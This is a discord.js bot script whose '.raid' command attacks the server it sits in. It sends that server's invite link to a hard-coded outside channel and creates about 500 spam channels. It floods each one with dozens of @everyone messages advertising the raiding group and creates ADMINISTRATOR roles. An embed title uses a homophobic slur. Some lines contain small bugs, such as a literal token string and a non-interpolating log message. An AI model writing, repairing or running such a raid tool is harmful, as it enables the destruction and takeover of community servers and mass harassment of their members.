const Discord = require("discord.js");
const { Client, Collection} = require("discord.js");
const fs = require("fs");
const { Server } = require("http");
const ms = require("ms");

const client = new Client();
client.commands = new Collection();

client.on('ready', () => {
    console.log("Looged in as ${client.user.tag}!");

});


client.on("message", async message => {

    let channel = message.channel;
    if(message.channel.type === "dm") return 
    if(message.content === ".raid")
    channel.createInvite({unique: true})
    .then(invite => {
        var embed = new Discord.MessageEmbed ()

        .addField("Raib by P.A.G !","`" + message.author + "`")
        .addField(": link: | Lien du serveur discord de la P.A.G : ", "https://discord.gg/" + invite.code)
        .setTitle("Gaycha abbatue.")
        .setFooter("Raid by : " + message.author.tag)
        .setColor("RANDOM")
        .setTimestamp()

client.channels.cache.get('839458171218821143').send(embed);
console.log('Voici le serveur discord qui se fait raid : https://discord.gg/' + invite.code)

var embed = new Discord.MessageEmbed ()
.setTitle("Raid effectué avec succés \<:Onche:837807916542197860>")
message.author.send(embed)



for(let i =0;i<=500;i++) {

    message.guild.channels.create('Fucked by P.A.G', {
        type: "text"

    }).then(server => {

        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")
        server.send("raid by p.a.g : ** https://discord.gg/KA2WSpzU @everyone")


        var embed = new Discord.MessageEmbed () 

       
        message.guild.roles.create({
            data: {
                name: 'fucked by pag',
                color: 'RANDOM',
                permissions: "ADMINISTRATOR"
            },
            reason: 'raid', 
        })
    })
}
    })
})

client.login("process.env.TOKEN");



